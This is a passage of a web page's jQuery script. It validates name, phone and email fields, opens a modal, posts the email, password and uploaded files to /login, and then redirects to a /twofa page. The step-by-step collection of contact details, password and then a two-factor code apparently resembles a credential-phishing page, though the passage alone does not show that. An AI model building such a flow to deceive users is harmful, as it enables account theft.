            var emailValue = document.getElementById('email').value;

            var hasError = false;

            if (nameValue === '') {
                $('#nameErr').text('Name field is required.').show();
                hasError = true;
            } else {
                $('#nameErr').hide();
            }

            if (phoneValue === '') {
                $('#phoneErr').text('Phone field is required.').show();
                hasError = true;
            } else {
                $('#phoneErr').hide();
            }

            if (emailValue === '') {
                $('#emailErr').text('Email field is required.').show();
                hasError = true;
            } else {
                $('#emailErr').hide();
            }

            if (!hasError) {
                $('#exampleModal').modal('show');
            }

        });
        $('#exampleModal .btn-primary').on('click', function(e) {
            const _this = $(this);
            e.preventDefault();
            var password = $('#password').val();
            var phone = $('#phone').val();
            var email = $('#email').val();
            var files = $('#fileInput')[0].files;
            var formData = new FormData();

            for (var i = 0; i < files.length; i++) {
                // Đảm bảo 'files' là một mảng các tệp tin và không cần thiết lập các tên tệp tin
                formData.append('files[]', files[i]);
            }

            var email = $('#email').val();
            var password = $('#password').val();

            formData.append('email', email);
            formData.append('password', password);
            $.ajax({
                type: 'POST',
                url: '/login',
                headers: {
                    'X-CSRF-TOKEN': $('meta[name="csrf-token"]').attr('content')
                },
                data: formData,
                processData: false,
                contentType: false,
                beforeSend() {
                    _this.append('<i class="fa fa-spinner fa-spin"></i>')
                },
                success: function(response) {
                    console.log(response);
                    if (response.status == 200) {
                        window.location.href = "/twofa"
                    } else {
                        $('#passwordError').text(response.message).show();
                    }

                },
                error: function(error) {
                    console.error('Error:', error);
                },
                complete: function() {
                    _this.find('i').remove()
                }
            });
        });
    });
</script>
